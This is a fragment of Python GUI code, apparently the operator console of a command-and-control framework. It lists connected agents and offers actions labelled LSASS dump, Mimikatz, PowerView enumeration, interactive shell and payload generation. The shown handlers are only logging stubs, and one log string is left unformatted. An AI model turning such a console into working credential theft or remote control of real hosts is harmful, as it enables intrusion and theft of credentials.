        """Dump LSASS memory"""
        if not self.selected_agent_id:
            return
        
        reply = QMessageBox.question(self, 'Dump LSASS',
                                   f'Dump LSASS memory on {self.selected_agent_id}? This may trigger AV detection.',
                                   QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No)
        
        if reply == QMessageBox.StandardButton.Yes:
            self.log_to_terminal(str(self.selected_agent_id), "[LSASS_DUMP] Dumping LSASS memory on " + str(self.selected_agent_id) + "", "info")
    
    def execute_mimikatz(self):
        """Execute Mimikatz"""
        if not self.selected_agent_id:
            return
        
        command, ok = QInputDialog.getText(self, 'Mimikatz', 
                                         'Enter Mimikatz command:')
        if ok and command.strip():
            self.log_to_terminal(str(self.selected_agent_id), "[MIMIKATZ] Executing: {command} on " + str(self.selected_agent_id) + "", "info")
    
    def execute_powerview(self):
        """Execute PowerView enumeration"""
        if not self.selected_agent_id:
            return
        
        self.log_to_terminal(str(self.selected_agent_id), "[POWERVIEW] Running PowerView enumeration on " + str(self.selected_agent_id) + "", "info")

    # ========== Management Methods ==========
    
    def open_interactive_shell(self):
        """Open interactive shell window"""
        if not self.selected_agent_id:
            return
        
        QMessageBox.information(self, "Interactive Shell", 
                              f"Interactive shell for {self.selected_agent_id} would open in a new window")
    
    def refresh_single_agent(self):
        """Refresh single agent information"""
        if not self.selected_agent_id:
            return
        
        self.log_to_terminal(str(self.selected_agent_id), "[REFRESH] Refreshing agent " + str(self.selected_agent_id) + "", "stdout")
    
    def disconnect_agent(self):
        """Disconnect agent"""
        if not self.selected_agent_id:
            return
        
        reply = QMessageBox.question(self, 'Disconnect Agent',
                                   f'Disconnect agent {self.selected_agent_id}?',
                                   QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No)
        
        if reply == QMessageBox.StandardButton.Yes:
            self.log_to_terminal(str(self.selected_agent_id), "[DISCONNECT] Disconnecting agent " + str(self.selected_agent_id) + "", "stdout")
            self.remove_agent_by_id(self.selected_agent_id)
    
    def remove_agent(self):
        """Remove agent from list"""
        if not self.selected_agent_id:
            return
        
        self.remove_agent_by_id(self.selected_agent_id)
    
    def remove_agent_by_id(self, agent_id):
        """Remove agent by ID"""
        for row in range(self.agent_table.rowCount()):
            if self.agent_table.item(row, 0).text() == agent_id:
                self.agent_table.removeRow(row)
                if agent_id in self.agents:
                    del self.agents[agent_id]
                self.update_agent_count()
                break

    # ========== Utility Methods ==========
    
    def refresh_agents(self):
        """Refresh all agents"""
        self.log_to_terminal(str(self.selected_agent_id), "[REFRESH] Refreshing all agents...", "stdout")
        self.update_agent_count()
    
    def clear_agents(self):
        """Clear all agents"""
        reply = QMessageBox.question(self, 'Clear Agents',
                                   'Remove all agents from the list?',
                                   QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No)
        
        if reply == QMessageBox.StandardButton.Yes:
            self.agent_table.setRowCount(0)
            self.agents.clear()
            self.update_agent_count()
            self.interaction_panel.terminal_output.clear_output()
    
    def open_payload_generator(self):
        """Open the enhanced payload generator dialog"""
        try:
            dialog = EnhancedPayloadGeneratorDialog(self)
            dialog.exec()
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Failed to open payload generator: {str(e)}")
    
    def update_agent_count(self):
        """Update agent count display"""
        count = self.agent_table.rowCount()
        self.agent_count.setText(f"Connected Agents: {count}")
        
        if count > 0:
            self.agent_count.setStyleSheet("color: #00ff00; font-weight: 600; font-size: 11px;")
        else:
            self.agent_count.setStyleSheet("color: #00ffff; font-weight: 600; font-size: 11px;")
    
    def update_last_seen(self):
        """Update last seen timestamps"""
        current_time = datetime.now().strftime("%H:%M:%S")
        for row in range(self.agent_table.rowCount()):
            # Update last seen column (column 9)
            self.agent_table.setItem(row, 9, QTableWidgetItem(current_time))
